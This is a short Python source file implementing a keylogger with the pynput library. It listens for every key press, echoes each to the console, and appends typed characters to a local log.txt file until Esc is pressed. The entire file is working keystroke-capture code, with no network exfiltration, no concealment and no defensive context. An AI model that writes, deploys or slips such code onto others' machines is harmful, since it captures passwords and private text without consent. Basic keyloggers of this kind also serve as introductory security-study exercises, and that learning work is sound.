import pynput
from pynput.keyboard import Key, Listener

#Count of keys in buffer before writing to log 
count = 0
#List of keys pressed
keys = []

#Managing the event of on_press
def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print("{0} pressed".format(key))
    if count >= 1:
        write_file(keys)
        count = 0
        keys = []

#Formatting the key name to be written from keys list 
def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)
                
#Maaging the event of on_release of key, pressing esc quits the program
def on_release(key):
    if key == Key.esc:
        return False

#Key press event listenner
with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()
